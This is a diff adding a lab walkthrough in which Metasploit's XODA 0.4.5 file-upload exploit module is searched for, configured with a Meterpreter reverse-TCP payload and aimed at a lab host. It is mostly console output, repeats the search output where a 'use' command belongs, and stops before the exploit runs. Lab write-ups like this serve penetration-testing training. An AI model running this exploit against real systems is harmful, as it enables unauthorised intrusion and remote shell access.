@@ -62,4 +62,115 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 6.44 seconds
 
 ```
-And we can see that the port 80 is open and runs a http service 
+And we can see that the port 80 is open and runs a http service. Now open msfconsole
+
+Since we know there's a vulnerability associated to XODA, search for the exploit.
+
+```
+msf6 > search xoda
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/xoda_file_upload
+
+```
+Select the exploit:
+
+```
+msf6 > search xoda
+
+Matching Modules
+================
+
+   #  Name                                  Disclosure Date  Rank       Check  Description
+   -  ----                                  ---------------  ----       -----  -----------
+   0  exploit/unix/webapp/xoda_file_upload  2012-08-21       excellent  Yes    XODA 0.4.5 Arbitrary PHP File Upload Vulnerability
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/xoda_file_upload
+
+```
+Now let's see the configuration options, with the show options command
+
+```
+msf6 exploit(unix/webapp/xoda_file_upload) > show options
+
+Module options (exploit/unix/webapp/xoda_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /xoda/           yes       The base path to the web application
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   XODA 0.4.5
+
+
+
+View the full module info with the info, or info -d command.
+
+
+```
+
+now, set the parameters
+
+```
+msf6 exploit(unix/webapp/xoda_file_upload) > set RHOSTS demo1.ine.local
+RHOSTS => demo1.ine.local
+msf6 exploit(unix/webapp/xoda_file_upload) > set TARGETURI /
+TARGETURI => /
+msf6 exploit(unix/webapp/xoda_file_upload) > show options
+
+Module options (exploit/unix/webapp/xoda_file_upload):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS     demo1.ine.local  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      80               yes       The target port (TCP)
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI  /                yes       The base path to the web application
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (php/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  127.0.0.1        yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   XODA 0.4.5
+
+
+
+View the full module info with the info, or info -d command.
+
+```
